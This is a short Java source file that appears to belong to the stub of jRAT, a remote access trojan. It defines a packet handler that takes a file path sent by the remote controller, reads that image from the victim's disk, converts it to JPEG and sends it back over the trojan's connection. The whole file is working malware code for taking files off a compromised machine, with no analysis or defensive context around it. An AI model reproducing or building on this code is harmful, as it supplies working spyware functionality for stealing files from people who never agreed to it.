package se.jrat.stub.packets.incoming;

import java.awt.image.BufferedImage;
import java.io.ByteArrayOutputStream;
import java.io.File;

import javax.imageio.ImageIO;

import se.jrat.stub.Connection;
import se.jrat.stub.packets.outgoing.Packet43PreviewImage;

public class Packet62PreviewImage extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		String file = Connection.readLine();

		BufferedImage image = ImageIO.read(new File(file));

		ByteArrayOutputStream bss = new ByteArrayOutputStream();

		ImageIO.write(image, "jpg", bss);
		byte[] buffer = bss.toByteArray();
		
		Connection.addToSendQueue(new Packet43PreviewImage(buffer, image.getWidth(), image.getHeight()));

	}

}
